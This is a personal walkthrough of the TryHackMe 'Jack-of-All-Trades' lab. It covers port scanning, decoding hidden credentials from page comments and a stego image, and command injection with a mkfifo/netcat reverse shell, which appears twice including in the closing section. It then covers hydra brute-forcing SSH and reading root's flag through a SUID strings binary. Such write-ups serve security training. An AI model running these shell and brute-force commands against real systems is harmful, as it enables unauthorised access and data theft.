## Jack-of-All-Trades
https://tryhackme.com/room/jackofalltrades

## Enum
```
nmap -Pn -sC -sV ip.thm -vv

Scanning ip.thm (10.10.40.122) [1000 ports]
Discovered open port 22/tcp on 10.10.40.122
Discovered open port 80/tcp on 10.10.40.122

Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.10 (Debian)
80/tcp open  ssh     syn-ack ttl 61 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBANucPy+D67M/cKVTYaHYYpt9bqPviYbWW/4+BFnUOQoNordc9Pc+8CauJqNFiebIqpKYKXhpEAt82m1IjQh8EmWdJYcQnkMFgukM3/mGjngXTbUO8vAbi53Zy8wwOaBlmRK9mvfAYEWPkcjzRmYgSp51TgEtSGWIyAkc1Lx6YVtDAAAAFQCsIgZJlrsYvAtF7Rmho7lIdn0WOwAAAIEApri35SyOophhqX45JcDpVASe3CSs8tPMGoOc0I9ZtTGt5qyb1cl7N3tXsP6mlrw4d4YNo8ct0w6TjsxPcJjGitRQ+SILWHy72XZ5Chde6yewKB5BeBjXrYvRR1rW+Tpia5kyjB4s0mGB7o3FMjX/dT+ISqYvZeVa7mQnBo0f0XMAAACAP89Ag2kmcs0FBt7KCBieH3UB6gF+LdeRVJHio5p4VQ8cTY1NZDyWqudS1TJq1BAToJSz9MqwUwzlILjRjuGQtylpssWSRbHyM0aqmJdORSMOCMUiEwyfk6T8+Vmama/AN7/htZeWBjWVeVEnbYJJQ6kPSCvZodMdOggYXcv32CA=
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbCwl2kyYWpv1DPDF0xQ5szNR1muMph6gJMJFw9VubKkSvHMWfg7CaCNcyo1QR5dg9buIygIGab8e9aigJdjQUY4XeBejwGe+vAA8RtPMoiLclR6g5qAqVQSeZ2FBzMrmkyKIgsSDb8tP+czpzn/Gp1HzDtiYUvleTvO2xEZ3k2Xz8YDvPlkV4zAIPzZSSZ8BABPYsBrePIwMpr/ZjeeiE59DlkUIv8x8M0z9KOls9zaeqFsbWrfMZzFgtPP+KILN6GrGijxgcGq5mDwvr67oHL3T3FtpReE+UZ/CafmzO/2Ls8XstmUiNeMaNBYtc6703/84bpL0uLp/pkILS8eqX
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO4p2E6NglzDeP40tJ42LjWaVrOcINmy42cspAv8DSzGD0K+V3El/tyGBxCJlMMR7wbN0968CQl61x0AkkAHLFk=
|   256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6jYsDJq1mWTDx7D+p3mMbqXhu9OhhW2p1ickLCdZ9E
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
🏴 👀 22 HTTP 80 SSH 🤔

```
curl http://ip.thm:22

<html>
        <head>
                <title>Jack-of-all-trades!</title>
                <link href="assets/style.css" rel=stylesheet type=text/css>
        </head>
        <body>
                <img id="header" src="assets/header.jpg" width=100%>
                <h1>Welcome to Jack-of-all-trades!</h1>
                <main>
                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
                        <img src="assets/stego.jpg">
                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
                        <img src="assets/jackinthebox.jpg">
                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCB....TcmFxCg== -->
                        <p>I hope you choose to employ me. I love making new friends!</p>
                        <p>Hope to see you soon!</p>
                        <p id="signature">Jack</p>
                </main>
        </body>
</html>
```
```
echo 'UmVtZW1iZXIgdG8gd2lzaCB....TcmFxCg==' | base64 -d

Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! 
Also gotta remember your password: *********
```
🏴 I got password.

```
wget ip.thm:22/assets/stego.jpg

file stego.jpg
stego.jpg: ASCII text, with CRLF line terminators

strings stego.jpg
SSH-2.0-OpenSSH_6.7p1 Debian-5
```

```
wget ip.thm:22/assets/jackinthebox.jpg

file jackinthebox.jpg
jackinthebox.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, progressive, precision 8, 640x474, components 3
```
🏴 Mummm. stego.jpg is just cheating ? 

```
curl http://ip.thm:22/recovery.php

<!DOCTYPE html>
<html>
        <head>
                <title>Recovery Page</title>
                <style>
                        body{
                                text-align: center;
                        }
                </style>
        </head>
        <body>
                <h1>Hello Jack! Did you forget your machine password again?..</h1>
                <form action="/recovery.php" method="POST">
                        <label>Username:</label><br>
                        <input name="user" type="text"><br>
                        <label>Password:</label><br>
                        <input name="pass" type="password"><br>
                        <input type="submit" value="Submit">
                </form>
                <!-- GQ2....NQ=  -->

        </body>
</html>
```

![image](https://user-images.githubusercontent.com/6504854/187488786-e2889b5e-ece9-482a-8cc1-4eac1c7c1416.png)

🏴 I'm stucked and checked writeups. Decode Base 32->Hex->Rot13 🤯. Jack loves cypher 😵.

```
wget http://ip.thm:22/assets/header.jpg

file header.jpg
header.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 1280x468, components 3

steghide extract -sf header.jpg
Enter passphrase:
wrote extracted data to "cms.creds".
```
![image](https://user-images.githubusercontent.com/6504854/187490923-530db11b-e4c2-49ec-8b59-8fa73cc008cf.png)

```
cat cms.creds
Here you go Jack. Good thing you thought ahead!

Username: j***********
Password: T***********
```
![image](https://user-images.githubusercontent.com/6504854/187492050-8fac8d3e-26bb-4f32-9fce-c87cca688ebc.png)

![image](https://user-images.githubusercontent.com/6504854/187492413-b2309702-a391-4c3d-9c28-9bca48cda289.png)

```
nc -lnvp 4444

curl 'ip.thm:22/nnxhweOV/index.php?cmd=ls;id;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.10.10+4444+>/tmp/f%3b' -b 'PHPSESSID=pv3m5iab2krog9qatsm1c0oi62; login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84'
```

## Flag
```
$ cd /home
$ ls
jack
jacks_password_list
```
```
hydra -l jack -P jacks_password_list ip.thm ssh -s 80
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] attacking ssh://ip.thm:80/
[80][ssh] host: ip.thm   login: jack   password: I**********
1 of 1 target successfully completed, 1 valid password found

ssh jack@ip.thm -p 80
jack@ip.thm's password:
jack@jack-of-all-trades:~$ ls
user.jpg
```

```
scp -P 80 jack@ip.thm:user.jpg .
```
🏴 I copied user.jpg to my local machine and got flag.

```
jack@jack-of-all-trades:~$find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null

-rwsr-x--- 1 root dev 27536 Feb 25  2015 /usr/bin/strings

jack@jack-of-all-trades:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth),1001(dev)

jack@jack-of-all-trades:~$ LFILE=/root/root.txt
jack@jack-of-all-trades:~$ strings "$LFILE"
```

Thank you for your reading. Happy hacking and Enjoy! 😄
 

## Omake
By using curl --data-urlencode I could send whiout url encoding of parameter's value.

I am confused with encodings always. 😫

```
curl -G -k http://ip.thm:22/nnxhweOV/index.php --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
2>&1|nc 10.10.10.10 4444 >/tmp/f' -b 'PHPSESSID=pv3m5iab2krog9qatsm1c0oi62; login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b
7d84'
```

 
 
